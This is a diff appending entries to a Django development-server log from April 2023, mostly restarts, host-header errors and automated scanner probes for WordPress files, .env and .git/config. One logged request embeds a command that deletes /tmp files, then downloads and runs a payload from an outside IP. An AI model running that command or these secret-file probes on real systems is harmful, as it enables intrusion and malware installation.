@@ -14765,3 +14765,411 @@ Traceback (most recent call last):
 django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi1263820.contaboserver.net'. You may need to add 'vmi1263820.contaboserver.net' to ALLOWED_HOSTS.
 Bad Request: /0bef
 [27/Apr/2023 21:15:22] "GET /0bef HTTP/1.1" 400 61084
+/var/www/venv/src/video/views.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:5233:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
+ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:5233:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
+System check identified no issues (0 silenced).
+April 27, 2023 - 21:24:25
+Django version 4.1.7, using settings 'project.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+[27/Apr/2023 21:25:14] "GET / HTTP/1.1" 200 7927
+[27/Apr/2023 21:26:30] "GET / HTTP/1.1" 200 8403
+[27/Apr/2023 21:26:31] "GET /static/images/logo.png HTTP/1.1" 200 39000
+[27/Apr/2023 21:26:46] "GET / HTTP/1.1" 200 8403
+[27/Apr/2023 21:26:47] "GET /static/images/logo.png HTTP/1.1" 200 39000
+/var/www/venv/src/video/views.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:5233:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
+ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
+ALSA lib conf.c:4745:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
+ALSA lib conf.c:5233:(snd_config_expand) Evaluate error: No such file or directory
+ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
+System check identified no issues (0 silenced).
+April 27, 2023 - 21:28:15
+Django version 4.1.7, using settings 'project.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'ip-api.com'. You may need to add 'ip-api.com' to ALLOWED_HOSTS.
+Bad Request: /http:/ip-api.com/json/5.189.171.130
+[27/Apr/2023 21:37:19] "GET http://ip-api.com/json/5.189.171.130 HTTP/1.1" 400 61035
+[27/Apr/2023 21:47:27] "GET / HTTP/1.1" 200 7927
+[27/Apr/2023 22:13:42] code 400, message Bad request version ('À\x14À')
+[27/Apr/2023 22:13:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+[27/Apr/2023 23:15:22] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
+[27/Apr/2023 23:15:22] "Z¥     " 400 -
+[28/Apr/2023 00:06:50] "GET / HTTP/1.1" 200 7927
+Not Found: /.env
+[28/Apr/2023 00:37:12] "GET /.env HTTP/1.1" 404 3481
+Not Found: /.env
+[28/Apr/2023 00:37:12] "POST /.env HTTP/1.1" 404 3482
+[28/Apr/2023 00:38:07] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[28/Apr/2023 00:38:07] "    c                           " 400 -
+[28/Apr/2023 00:38:10] code 400, message Bad request syntax ('\xa0\x00\x00`\x00\x00\x00\x00admin\x00\x00\x00admin\x00\x00\x00\x04\x01\x00\x00\x00\x00¡ª')
+[28/Apr/2023 00:38:10] "   `    admin   admin       ¡ª" 400 -
+Not Found: /CGI/Execute
+[28/Apr/2023 00:40:34] "POST /CGI/Execute HTTP/1.1" 404 3503
+[28/Apr/2023 00:40:34] "GET /admin/config.php HTTP/1.1" 302 0
+Not Found: /recordings/theme/main.css
+[28/Apr/2023 00:40:34] "GET /recordings/theme/main.css HTTP/1.1" 404 3544
+[28/Apr/2023 00:47:53] "GET / HTTP/1.1" 200 7927
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[28/Apr/2023 00:52:46] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 400 62066
+[28/Apr/2023 02:02:34,363] - Broken pipe from ('162.142.125.12', 37984)
+[28/Apr/2023 02:02:35] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 02:02:35,628] - Broken pipe from ('162.142.125.12', 33008)
+[28/Apr/2023 02:02:35] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 02:02:36] code 505, message Invalid HTTP version (2.0)
+[28/Apr/2023 02:02:36] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[28/Apr/2023 02:02:36] "GET /favicon.ico HTTP/1.1" 404 3507
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Apr/2023 02:23:43] "GET / HTTP/1.1" 400 61904
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /wp-includes/ID3/license.txt
+[28/Apr/2023 02:23:44] "GET /wp-includes/ID3/license.txt HTTP/1.1" 400 62118
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /feed/
+[28/Apr/2023 02:23:45] "GET /feed/ HTTP/1.1" 400 61876
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /xmlrpc.php
+[28/Apr/2023 02:23:46] "GET /xmlrpc.php?rsd HTTP/1.1" 400 62242
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /blog/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:46] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62173
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /web/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:47] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62162
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /wordpress/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:48] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62228
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /wp/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:49] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62151
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /2020/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:49] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62173
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /2019/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:50] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62173
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /2021/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:51] "GET /2021/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62173
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /shop/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:52] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62173
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /wp1/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:52] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62162
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /test/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:53] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62173
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /site/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:54] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62173
+Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'vmi84858.contabo.host'. You may need to add 'vmi84858.contabo.host' to ALLOWED_HOSTS.
+Bad Request: /cms/wp-includes/wlwmanifest.xml
+[28/Apr/2023 02:23:55] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 400 62162
+Not Found: /.env
+[28/Apr/2023 02:31:11] "GET /.env HTTP/1.1" 404 3481
+Forbidden (CSRF cookie not set.): /
+[28/Apr/2023 02:31:11] "POST / HTTP/1.1" 403 2870
+[28/Apr/2023 02:50:01,493] - Broken pipe from ('167.248.133.51', 48264)
+[28/Apr/2023 02:50:02] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 02:50:02,768] - Broken pipe from ('167.248.133.51', 54836)
+[28/Apr/2023 02:50:02] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 02:50:03] code 505, message Invalid HTTP version (2.0)
+[28/Apr/2023 02:50:03] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[28/Apr/2023 02:50:03] "GET /favicon.ico HTTP/1.1" 404 3507
+[28/Apr/2023 02:51:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[28/Apr/2023 02:51:42] "  /*à     Cookie: mstshash=Administr" 400 -
+[28/Apr/2023 02:57:33] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 03:13:55] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 03:51:21] "GET / HTTP/1.1" 200 8403
+[28/Apr/2023 03:51:22] "GET /static/images/logo.png HTTP/1.1" 304 0
+[28/Apr/2023 03:57:01] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 04:13:12] code 400, message Bad request version ('F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[28/Apr/2023 04:13:12] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+Not Found: /.git/config
+[28/Apr/2023 04:28:11] "GET /.git/config HTTP/1.1" 404 3502
+[28/Apr/2023 04:28:34] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+[28/Apr/2023 04:28:34] "    c                           " 400 -
+[28/Apr/2023 04:32:07] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
+[28/Apr/2023 04:32:07] "Z¥     " 400 -
+[28/Apr/2023 04:36:53] "GET / HTTP/1.1" 200 8403
+[28/Apr/2023 04:36:54] "GET /static/images/logo.png HTTP/1.1" 200 39000
+Not Found: /favicon.ico
+[28/Apr/2023 04:36:54] "GET /favicon.ico HTTP/1.1" 404 3502
+[28/Apr/2023 04:53:09] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 05:19:48] "GET / HTTP/1.1" 200 7927
+Invalid HTTP_HOST header: 'check.best-proxies.ru:443'. You may need to add 'check.best-proxies.ru' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'check.best-proxies.ru:443'. You may need to add 'check.best-proxies.ru' to ALLOWED_HOSTS.
+Bad Request: /
+[28/Apr/2023 05:58:56] "CONNECT / HTTP/1.1" 400 61624
+Invalid HTTP_HOST header: 'check.best-proxies.ru'. You may need to add 'check.best-proxies.ru' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'check.best-proxies.ru'. You may need to add 'check.best-proxies.ru' to ALLOWED_HOSTS.
+Bad Request: /ip.php
+[28/Apr/2023 05:59:06] "GET /ip.php?Z70926136900Q1 HTTP/1.1" 400 62527
+[28/Apr/2023 06:01:39] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 06:16:21] "GET / HTTP/1.1" 200 7927
+Not Found: /HNAP1/
+[28/Apr/2023 06:16:21] "POST /HNAP1/ HTTP/1.1" 404 3491
+Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/var/www/venv/lib/python3.9/site-packages/django/core/handlers/exception.py", line 56, in inner
+    response = get_response(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/utils/deprecation.py", line 135, in __call__
+    response = self.process_request(request)
+  File "/var/www/venv/lib/python3.9/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/var/www/venv/lib/python3.9/site-packages/django/http/request.py", line 152, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /device.rsp
+[28/Apr/2023 06:16:28] "GET /device.rsp?opt=user&cmd=list HTTP/1.1" 400 62001
+Not Found: /druid/index.html
+[28/Apr/2023 06:36:52] "GET /druid/index.html HTTP/1.1" 404 3517
+[28/Apr/2023 06:48:42] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 7927
+[28/Apr/2023 06:50:12] "GET / HTTP/1.1" 200 7927
+[28/Apr/2023 06:50:12] "GET / HTTP/1.1" 200 7927
+Not Found: /favicon.ico
+[28/Apr/2023 06:50:13] "GET /favicon.ico HTTP/1.1" 404 3502
+Not Found: /.env
+[28/Apr/2023 06:59:19] "GET /.env HTTP/1.1" 404 3481
+Forbidden (CSRF cookie not set.): /
+[28/Apr/2023 06:59:20] "POST / HTTP/1.1" 403 2870
+[28/Apr/2023 08:01:50] "GET / HTTP/1.1" 200 8403
+[28/Apr/2023 08:01:50] "GET /static/images/logo.png HTTP/1.1" 304 0
+[28/Apr/2023 08:01:51] "GET / HTTP/1.1" 200 8403
+[28/Apr/2023 08:01:52] "GET / HTTP/1.1" 200 8403
